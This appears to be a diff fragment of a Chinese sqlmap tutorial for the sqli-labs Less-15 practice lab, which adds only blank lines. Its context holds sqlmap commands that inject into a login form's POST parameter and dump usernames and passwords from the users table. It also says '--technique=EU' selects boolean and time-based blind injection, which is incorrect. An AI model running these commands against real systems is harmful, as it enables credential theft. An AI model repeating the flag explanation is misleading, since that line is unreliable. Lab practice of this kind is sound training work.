@@ -327,6 +327,8 @@ sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1
 - `--data` 指定post方法要用的数据
 -  `-p` 指定注入参数
 - `--technique=EU`：指定注入方式为布尔盲注和时间盲注
+
+
 ```bash
 sqlmap -u "http://192.168.126.1/sqli-labs/Less-15/" --data="uname=admin&passwd=1&submit=Submit" -p uname -D security -T users  -C username,password,id --dump --batch
  
